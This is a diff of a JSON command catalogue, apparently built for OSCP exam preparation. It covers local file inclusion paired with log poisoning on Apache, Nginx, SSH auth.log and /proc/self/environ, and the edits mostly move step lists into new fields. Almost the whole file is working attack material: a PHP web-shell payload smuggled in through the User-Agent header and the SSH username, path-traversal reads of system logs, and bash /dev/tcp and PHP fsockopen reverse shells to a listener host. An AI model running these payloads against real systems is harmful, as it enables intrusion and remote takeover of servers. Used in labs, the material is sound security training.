@@ -46,14 +46,12 @@
         "Empty log file or permission denied on LFI read"
       ],
       "notes": "Manual alternative:\nUse netcat to send raw HTTP request:\necho -e 'GET / HTTP/1.1\\r\\nHost:\n<TARGET>\\r\\nUser-Agent:\n<?php system($_GET[\"c\"]); ?>\\r\\n\\r\\n' | nc <TARGET> <PORT>.\n\nTiming:\n1-2 minutes for poisoning.\n\nAdd 2-3 minutes for LFI trigger and shell upgrade.\n\nTotal:\n3-5 minutes.\n\nSuccess rate:\nHigh (70-80% when LFI confirmed and logs accessible).",
-      "next_steps": [
-        "Trigger RCE: curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=whoami'",
-        "Verify execution: Look for command output in response (often buried in log noise)",
-        "Establish reverse shell: Use c=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' parameter",
-        "If system() blocked: Try exec(), passthru(), shell_exec(), popen() in payload"
-      ],
+      "next_steps": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "Trigger RCE: curl 'http://<TARGET>/page.php?file=../../../../var/log/apache2/access.log&c=whoami' Verify execution: Look for command output in response (often buried in log noise) Establish reverse shell: Use c=bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1' parameter If system() blocked: Try exec(), passthru(), shell_exec(), popen() in payload"
+      }
     },
     {
       "id": "curl-ua-poison-nginx",
@@ -85,20 +83,18 @@
       "flag_explanations": {
         "-A": "User-Agent header injection (same as Apache). Nginx difference: Default log format includes User-Agent as '$http_user_agent' variable. Nginx Combined Log Format: '$remote_addr - $remote_user [$time_local] \"$request\" $status $body_bytes_sent \"$http_referer\" \"$http_user_agent\"'. No sanitization occurs - direct string interpolation. Key difference from Apache: Nginx allows custom log formats, so User-Agent logging might be disabled (check nginx.conf). If disabled, try Referer header instead."
       },
-      "next_steps": [
-        "Detect Nginx: curl -I http://<TARGET>:<PORT>/ | grep Server",
-        "Enumerate log path: Try /var/log/nginx/access.log, then /var/log/nginx/<VHOST>_access.log if multi-vhost setup",
-        "Check worker user: Use LFI to read /etc/nginx/nginx.conf, look for 'user' directive",
-        "Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/nginx/access.log&c=id'",
-        "If permission denied: Try error.log instead (often more permissive)"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nRaw HTTP via netcat (same as Apache variant).\n\nOr use telnet:\ntelnet <TARGET> <PORT>, then manually type:\nGET / HTTP/1.1<ENTER>Host:\n<TARGET><ENTER>User-Agent:\n<?php system($_GET[\"c\"]); ?><ENTER><ENTER> Success rate:\nMedium-High (60-70%).\n\nLower than Apache because:\n(1) Nginx admins more likely to customize log format, (2) SELinux/AppArmor more common on Nginx setups, (3) User-Agent logging sometimes disabled for performance.\n\nHigher success on default Nginx installs.\n\nTiming:\n2-3 minutes (slightly longer than Apache due to path/user enumeration).\n\nAdd 1 minute for initial Nginx vs Apache detection.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "Detect Nginx: curl -I http://<TARGET>:<PORT>/ | grep Server Enumerate log path: Try /var/log/nginx/access.log, then /var/log/nginx/<VHOST>_access.log if multi-vhost setup Check worker user: Use LFI to read /etc/nginx/nginx.conf, look for 'user' directive Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/nginx/access.log&c=id'",
+        "on_failure": "If permission denied: Try error.log instead (often more permissive)"
+      }
     },
     {
       "id": "lfi-access-log-apache",
@@ -140,19 +136,18 @@
         }
       ],
       "flag_explanations": {},
-      "next_steps": [
-        "If successful: Proceed with User-Agent poisoning (curl-ua-poison-apache)",
-        "If permission denied: Try alternative logs (error.log, /var/log/auth.log, /var/log/syslog)",
-        "If wrong path: Try CentOS variant (/var/log/httpd/access_log), vhost-specific logs",
-        "Alternative technique: /proc/self/environ if all logs fail"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nUse browser:\nNavigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log directly.\n\nAdvantage:\nSee formatted output with syntax highlighting extensions.\n\nDisadvantage:\nBrowser modifies User-Agent (harder to control payload injection).\n\nFor exam:\ncurl preferred (scriptable, exact control).\n\nSuccess rate:\nMedium (50-60%).\n\nMany modern setups restrict log permissions (640 root:adm).\n\nDefault Apache on older Ubuntu (<=16.04) often world-readable (644).\n\nOSCP boxes tend toward permissive configs for challenge purposes.\n\nTiming:\n30 seconds to 1 minute (quick verification step before poisoning).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "If successful: Proceed with User-Agent poisoning (curl-ua-poison-apache) If wrong path: Try CentOS variant (/var/log/httpd/access_log), vhost-specific logs Alternative technique: /proc/self/environ if all logs fail",
+        "on_failure": "If permission denied: Try alternative logs (error.log, /var/log/auth.log, /var/log/syslog)"
+      }
     },
     {
       "id": "lfi-access-log-nginx",
@@ -194,19 +189,17 @@
         }
       ],
       "flag_explanations": {},
-      "next_steps": [
-        "If successful: Poison via curl-ua-poison-nginx",
-        "If permission denied: Try /var/log/nginx/error.log (different permissions)",
-        "If multi-vhost suspected: Enumerate vhost names, try <VHOST>_access.log pattern",
-        "Nginx-specific alternative: /var/log/nginx/<VHOST>.access.log (dot separator used by some configs)"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nBrowser-based testing (same as Apache).\n\nFor multi-vhost enumeration:\nUse gobuster/wfuzz to fuzz vhost names, then try /var/log/nginx/<VHOST>_access.log.\n\nExample:\nwfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://<TARGET>/index.php?file=../../../../var/log/nginx/FUZZ_access.log' --hh 0 Success rate:\nMedium (50-60%, similar to Apache).\n\nNginx advantage:\nerror.log often 644 permissions (more permissive than Apache error.log which is typically 640).\n\nTiming:\n1 minute (includes Nginx detection + log path enumeration).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "If successful: Poison via curl-ua-poison-nginx If permission denied: Try /var/log/nginx/error.log (different permissions) If multi-vhost suspected: Enumerate vhost names, try <VHOST>_access.log pattern Nginx-specific alternative: /var/log/nginx/<VHOST>.access.log (dot separator used by some configs)"
+      }
     },
     {
       "id": "ssh-authlog-poison",
@@ -231,20 +224,17 @@
         }
       ],
       "flag_explanations": {},
-      "next_steps": [
-        "Verify SSH open: nmap -p 22 <TARGET> (should show 22/tcp open ssh)",
-        "Verify log readable: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log' | grep sshd",
-        "Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log&c=whoami'",
-        "Look for output near: 'Failed password for <?php system($_GET[\"c\"]); ?>' log entry",
-        "If output not visible: Log noise high in auth.log - grep for your IP to find relevant section"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nIf SSH client rejects PHP payload (some clients validate username format):\nUse raw TCP socket.\n\nPython one-liner:\npython3 -c \"import socket; s=socket.socket(); s.connect(('<TARGET>',22)); s.recv(1024); s.send(b'SSH-2.0-OpenSSH_8.0\\r\\n'); s.send(b'<?php system(\\$_GET[\\\"c\\\"]); ?>\\r\\n')\" (less reliable but bypasses client validation).\n\nSuccess rate:\nHigh (70-80% when SSH exposed and auth.log readable).\n\nAdvantages over web log poisoning:\n(1) auth.log often group-readable (syslog group), (2) less likely to have SELinux restrictions, (3) works even if no web server running.\n\nDisadvantages:\n(1) Requires SSH port open, (2) generates failed login alerts (stealth concern in real engagements, not OSCP).\n\nTiming:\n1-2 minutes for poisoning.\n\n30 seconds for SSH detection (nmap).\n\nTotal:\n2-3 minutes.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "Verify SSH open: nmap -p 22 <TARGET> (should show 22/tcp open ssh) Verify log readable: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log' | grep sshd Trigger RCE: curl 'http://<TARGET>/vuln.php?page=../../../../var/log/auth.log&c=whoami' Look for output near: 'Failed password for <?php system($_GET[\"c\"]); ?>' log entry If output not visible: Log noise high in auth.log - grep for your IP to find relevant section"
+      }
     },
     {
       "id": "lfi-auth-log",
@@ -286,19 +276,18 @@
         }
       ],
       "flag_explanations": {},
-      "next_steps": [
-        "If readable: Proceed with ssh-authlog-poison",
-        "If permission denied: Check /var/log/syslog (sometimes more permissive, includes auth events)",
-        "Enumeration bonus: Extract usernames from 'Accepted password for <user>' entries",
-        "RHEL/CentOS variant: Try /var/log/secure instead of auth.log"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nBrowser-based or use wget:\nwget -q -O - 'http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/auth.log' (wget advantage:\nsaves to file for offline analysis).\n\nSuccess rate:\nMedium-High (60-70%).\n\nauth.log often more permissive than web logs.\n\nDefault permissions:\n640 root:adm, but www-data sometimes in adm group (Ubuntu Server default) or syslog group.\n\nTiming:\n30 seconds (quick verification).",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "If readable: Proceed with ssh-authlog-poison If permission denied: Check /var/log/syslog (sometimes more permissive, includes auth events) Enumeration bonus: Extract usernames from 'Accepted password for <user>' entries",
+        "on_failure": "RHEL/CentOS variant: Try /var/log/secure instead of auth.log"
+      }
     },
     {
       "id": "lfi-proc-environ",
@@ -343,20 +332,18 @@
       "flag_explanations": {
         "-A": "User-Agent header becomes HTTP_USER_AGENT environment variable in PHP process. When we include /proc/self/environ via LFI, this variable (with our payload) is parsed by PHP interpreter. Critical: Must poison in SAME REQUEST as LFI (curl -A sets header for that specific request). Advantage over log poisoning: No permission issues - /proc always readable. Disadvantage: Must include /proc/self/environ in same request that contains payload (log poisoning allows separation of injection and trigger)."
       },
-      "next_steps": [
-        "Verify /proc readable: curl 'http://<TARGET>/vuln.php?page=../../../../proc/self/cmdline' (should show PHP command)",
-        "Poison and trigger in same request (already done by command above)",
-        "Add RCE parameter: Append '&c=id' to URL",
-        "Parse output: Look for command result near HTTP_USER_AGENT variable",
-        "If fails: Check /proc/self/fd/ directory (alternative proc technique)"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nTwo-step approach using telnet:\n(1) telnet <TARGET> <PORT>, (2) Manually type:\nGET /<LFI_PARAM>?<PARAM>=../../../../proc/self/environ HTTP/1.1<ENTER>Host:\n<TARGET><ENTER>User-Agent:\n<?php system($_GET[\"c\"]); ?><ENTER><ENTER>.\n\nSame result, more control over exact request format.\n\nSuccess rate:\nMedium (50-60%).\n\nWorks when:\n(1) /proc filesystem mounted, (2) PHP not in strict safe_mode.\n\nFails when:\n(1) Docker/container with --security-opt no-new-privileges, (2) /proc mounted with hidepid=2 option (paranoid security), (3) PHP CGI mode (different process context).\n\nSuccess rate lower than log poisoning but critical fallback.\n\nTiming:\n2-3 minutes (includes understanding /proc output format).\n\nFaster if familiar with technique.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "Verify /proc readable: curl 'http://<TARGET>/vuln.php?page=../../../../proc/self/cmdline' (should show PHP command) Poison and trigger in same request (already done by command above) Add RCE parameter: Append '&c=id' to URL Parse output: Look for command result near HTTP_USER_AGENT variable",
+        "on_failure": "If fails: Check /proc/self/fd/ directory (alternative proc technique)"
+      }
     },
     {
       "id": "lfi-rce-trigger",
@@ -404,20 +391,17 @@
         }
       ],
       "flag_explanations": {},
-      "next_steps": [
-        "Verify RCE: Start with simple command (whoami, id, pwd)",
-        "Enumerate restrictions: &c='cat /etc/php/7.4/apache2/php.ini | grep disable_functions'",
-        "Reverse shell (Bash): &c='bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"'",
-        "If bash blocked: Try PHP reverse shell: &c='php -r \"$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");\"'",
-        "URL encode complex commands: Use Burp Decoder or: python3 -c 'import urllib.parse; print(urllib.parse.quote(\"<COMMAND>\"))'"
-      ],
+      "next_steps": [],
       "category": "web",
       "notes": "Manual alternative:\nBrowser-based for simple commands:\nNavigate to http://<TARGET>/<LFI_PARAM>?<PARAM>=../../../../var/log/apache2/access.log&c=whoami.\n\nFor complex commands (reverse shells with special chars):\nUse Burp Suite Repeater to avoid URL encoding issues.\n\nBest practice:\nURL-encode <COMMAND> for reliability (bash -c becomes bash%20-c).\n\nSuccess rate:\nVery High (90-95% after successful poisoning).\n\nMain failure point is earlier (poisoning/log access), not execution.\n\nIf you reach this step, RCE almost guaranteed unless PHP restrictions present.\n\nTiming:\n30 seconds per command test.\n\n2-3 minutes for reverse shell establishment.",
       "alternatives": [],
       "success_indicators": [],
       "failure_indicators": [],
       "prerequisites": [],
-      "troubleshooting": {}
+      "troubleshooting": {},
+      "methodology_guidance": {
+        "after_success": "Verify RCE: Start with simple command (whoami, id, pwd) Enumerate restrictions: &c='cat /etc/php/7.4/apache2/php.ini | grep disable_functions' Reverse shell (Bash): &c='bash -c \"bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1\"' If bash blocked: Try PHP reverse shell: &c='php -r \"$sock=fsockopen(\"<LHOST>\",<LPORT>);exec(\"/bin/sh -i <&3 >&3 2>&3\");\"' URL encode complex commands: Use Burp Decoder or: python3 -c 'import urllib.parse; print(urllib.parse.quote(\"<COMMAND>\"))'"
+      }
     }
   ]
 }
